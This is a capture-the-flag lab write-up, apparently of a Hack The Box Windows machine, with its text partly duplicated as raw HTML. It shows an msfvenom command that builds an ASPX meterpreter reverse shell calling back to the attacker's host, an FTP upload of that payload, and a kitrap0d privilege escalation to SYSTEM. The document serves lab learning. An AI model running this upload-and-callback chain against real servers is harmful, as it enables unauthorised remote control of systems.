I explored a directory but couldn&rsquo;t find any useful info on the server.


Because the http port 80 server is also open, I tried navigating to the address on Firefox.


More information gathering
Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.

    <h4 id="scanning-with-nmap">Scanning with nmap</h4>
<p>the nmap scan results show that <strong><em>ftp-anonymous</em></strong> login is allowed.
<img src="image.png#center" alt="alt text"></p>
<br>
<p>I explored a directory but couldn&rsquo;t find any useful info on the server.
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p>Because the http port 80 server is also open, I tried navigating to the address on Firefox.
<img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="more-information-gathering">More information gathering</h4>
<p>Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.
<img src="image-3.png#center" alt="alt text"></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="generating-a-payload">Generating a payload</h4>
<p>I generated a reverse shell payload with <strong><em>msfvenom</em></strong> and the extension is <strong><em>.asp</em></strong> since we saw the extension on the ftp server.</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f asp &gt; reverse.aspx</code></p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>uploaded the reverse shell that I generated onto the ftp server using the <strong><em>put</em></strong> command.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>Before navigating to <strong>http://10.10.10.5/reverse.aspx</strong>, I had to start a netcat server to listen to the port by running the following command:
<code>nc -lvnp 1234</code></p>
<br>
<p>For some reason, my netcat listener kept crashing. As an alternative, I switched to <strong><em>msfconsole</em></strong> and utilized <strong><em>multi/handler</em></strong> to listen ports.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<p>I was able to get the shell but the user was not the admin with low privileges that I couldn&rsquo;t access many directories with the current user. As you could see from the picture below the <strong><em>getuid</em></strong> returned IIS APPPOOL\Web which is not the administrator. It was time to utilize the <strong><em>privilege escaltion</em></strong> to move vertically and gain access.</p>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<p>After some research, I learned that there exists a post module in meterpreter. So I backgrouned the current session and searched for the module. <code>search type:post path:post/multi</code>.</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<p>As the name of the exploit (<strong><em>local_exploit_suggester</em></strong>) implies it suggested many available exploits and I decided to use the 3rd exploit, which is <strong>exploit/windows/local/ms10_015_kitrap0d</strong>.</p>
<p><img src="image-13.png#center" alt="alt text"></p>
<br>
<p>set the <strong><em>SESSION</em></strong> as 1, because the backgrouned session is the only session we have and set othe required options.</p>
<p><img src="image-14.png#center" alt="alt text"></p>
<br>
<p>I succeeded in getting the root shell. <strong><em>getuid</em></strong> command returned NT AUTHORITY\SYSTEM, another name for root.
<img src="image-15.png#center" alt="alt text"></p>
<br>
<p>found the user flag.
<img src="image-17.png#center" alt="alt text"></p>
<br>
<p>found the root flag.
<img src="image-16.png#center" alt="alt text"></p>
